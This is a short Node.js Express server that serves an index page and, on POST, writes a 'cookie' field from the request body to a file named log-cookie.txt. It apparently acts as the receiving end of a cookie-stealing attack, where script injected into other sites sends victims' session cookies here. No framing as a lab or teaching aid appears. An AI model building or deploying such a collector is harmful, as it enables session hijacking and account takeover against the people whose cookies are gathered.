var fs = require('fs');
const express = require('express')
const app = express()
var path = require('path');

app.use(express.json());       // to support JSON-encoded bodies

app.get('/', function(req, res) {
    res.sendFile(path.join(__dirname + '/index.html'));
});


app.post('/', function (req, res) {
  var json = req.body.cookie;
  
  console.log(json);

  fs.open('./log-cookie.txt', 'a', (err, fd) => {
  
    if (err) throw err;
    fs.appendFile(fd, json + '\n', 'utf8', (err) => {
    fs.close(fd, (err) => {
      if (err) throw err;
    });
    if (err) throw err;
  });
});

  res.send('thanks');
})

app.listen(3000, () => console.log('Example app listening on port 3000!'))
